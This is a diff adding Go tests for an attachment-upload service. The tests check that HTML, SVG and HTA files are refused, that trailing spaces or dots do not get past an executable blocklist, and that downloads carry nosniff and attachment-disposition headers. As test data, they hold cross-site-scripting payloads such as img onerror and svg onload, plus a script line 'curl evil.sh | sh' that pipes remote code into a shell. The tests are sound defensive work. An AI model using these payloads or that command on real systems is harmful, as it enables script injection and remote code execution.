@@ -122,6 +122,76 @@ func TestClassifyAttachment_RejectsHTMLAndScriptContent(t *testing.T) {
 	}
 }
 
+// The sniff-based refusal above only fires on content that trips one of Go's
+// seventeen HTML tag signatures. These payloads trip none of them, so before
+// the extension check each was classified text/plain and stored.
+func TestClassifyAttachment_RefusesMarkupExtensions(t *testing.T) {
+	payloads := []string{
+		`<img src=x onerror=alert(document.domain)>`,
+		`<svg onload=alert(1)>`,
+		`<video><source onerror=alert(1)></video>`,
+		"just some words\n", // the extension decides, not the content
+	}
+	// The trailing-space and trailing-dot spellings are here because the same
+	// normalisation has to serve this list and the executable blocklist.
+	names := []string{
+		"a.html", "a.htm", "a.xhtml", "a.shtml", "a.mhtml", "a.mht", "a.svg",
+		"a.HTML", "a.html ", "a.html.",
+		"a.hta", // refused as an executable rather than as markup
+	}
+	for _, name := range names {
+		for _, payload := range payloads {
+			if got, err := ClassifyAttachment(name, []byte(payload)); err == nil {
+				t.Errorf("ClassifyAttachment(%q, %q) accepted as %q; markup extensions are refused outright", name, payload, got)
+			}
+		}
+	}
+}
+
+// The audit's end-to-end payload: accepted and stored as text/plain before the
+// extension check existed.
+func TestAttachmentUpload_RefusesMarkupFiles(t *testing.T) {
+	srv, _ := attachmentTestServer(t)
+
+	rec := uploadAttachments(t, srv, []uploadFile{
+		{name: "xss.html", mime: "text/plain", content: `<img src=x onerror=alert(document.domain)>`},
+		{name: "xss.svg", mime: "image/svg+xml", content: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`},
+	})
+	if rec.Code != http.StatusBadRequest {
+		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
+	}
+	resp := decodeUploadResponse(t, rec)
+	if len(resp.Attachments) != 0 {
+		t.Errorf("stored %d files, want 0: %s", len(resp.Attachments), rec.Body.String())
+	}
+	if len(resp.Failures) != 2 {
+		t.Fatalf("failures = %+v, want both files reported", resp.Failures)
+	}
+}
+
+// A trailing space is not a new extension. The audit stored "trailing.sh " and
+// "trailing2.sh." through this path.
+func TestAttachmentUpload_TrailingCharactersDoNotDefeatTheBlocklist(t *testing.T) {
+	srv, _ := attachmentTestServer(t)
+
+	script := "#!/bin/bash\ncurl evil.sh | sh\n"
+	rec := uploadAttachments(t, srv, []uploadFile{
+		{name: "trailing.sh ", mime: "text/plain", content: script},
+		{name: "trailing2.sh.", mime: "text/plain", content: script},
+		{name: "blocked.sh", mime: "text/plain", content: script},
+	})
+	if rec.Code != http.StatusBadRequest {
+		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
+	}
+	resp := decodeUploadResponse(t, rec)
+	if len(resp.Attachments) != 0 {
+		t.Errorf("stored %d files, want 0: %s", len(resp.Attachments), rec.Body.String())
+	}
+	if len(resp.Failures) != 3 {
+		t.Fatalf("failures = %+v, want all three reported", resp.Failures)
+	}
+}
+
 // The allowlist entries the brief pins (D3). Nothing in this change may flip
 // them, whatever route the file arrives by.
 func TestAllowedMimeTypes_HTMLAndJavaScriptStayBlocked(t *testing.T) {
@@ -359,5 +429,62 @@ func TestAttachmentUpload_OversizedFileIsAPerFileFailure(t *testing.T) {
 	}
 	if !strings.Contains(resp.Failures[0].Error, "maximum size") {
 		t.Errorf("failure reason = %q, want it to mention the size limit", resp.Failures[0].Error)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Download headers
+// ---------------------------------------------------------------------------
+
+// Storing developer files as text is now the ordinary path, and what keeps a
+// stored text file from being interpreted is two response headers: nosniff, so
+// a browser does not go looking for markup in a text/plain body, and an
+// attachment disposition, so it is never rendered as a top-level document.
+// Nothing asserted either of them before, which made the whole "stored as text
+// is harmless" argument rest on code no test defended.
+func TestAttachmentDownload_SetsNosniffAndDisposition(t *testing.T) {
+	srv, _ := attachmentTestServer(t)
+
+	rec := uploadAttachments(t, srv, []uploadFile{
+		{name: "notes.log", mime: "application/octet-stream", content: "started\n"},
+		{name: "readme.md", mime: "application/octet-stream", content: "# Readme\n"},
+		{name: "bundle.zip", mime: "application/octet-stream", content: "PK\x03\x04" + strings.Repeat("\x00", 16)},
+		{name: "photo.png", mime: "application/octet-stream", content: "\x89PNG\r\n\x1a\n" + strings.Repeat("\x00", 16)},
+	})
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("upload: expected 201, got %d: %s", rec.Code, rec.Body.String())
+	}
+	resp := decodeUploadResponse(t, rec)
+	if len(resp.Attachments) != 4 {
+		t.Fatalf("stored %d files, want 4: %s", len(resp.Attachments), rec.Body.String())
+	}
+
+	want := map[string]struct{ mime, disposition string }{
+		"notes.log":  {"text/plain", "attachment"},
+		"readme.md":  {"text/markdown", "attachment"},
+		"bundle.zip": {"application/zip", "attachment"},
+		// The one type that is served for the browser to render, and the only
+		// one that may be.
+		"photo.png": {"image/png", "inline"},
+	}
+	for _, att := range resp.Attachments {
+		expected, ok := want[att.Name]
+		if !ok {
+			t.Fatalf("unexpected attachment %q", att.Name)
+		}
+		got := doRequest(t, srv, http.MethodGet, att.URL, nil)
+		if got.Code != http.StatusOK {
+			t.Fatalf("GET %s: expected 200, got %d: %s", att.URL, got.Code, got.Body.String())
+		}
+		if h := got.Header().Get("X-Content-Type-Options"); h != "nosniff" {
+			t.Errorf("%s: X-Content-Type-Options = %q, want nosniff", att.Name, h)
+		}
+		if h := got.Header().Get("Content-Type"); h != expected.mime {
+			t.Errorf("%s: Content-Type = %q, want %q", att.Name, h, expected.mime)
+		}
+		wantCD := expected.disposition + `; filename="` + att.Name + `"`
+		if h := got.Header().Get("Content-Disposition"); h != wantCD {
+			t.Errorf("%s: Content-Disposition = %q, want %q", att.Name, h, wantCD)
+		}
 	}
 }
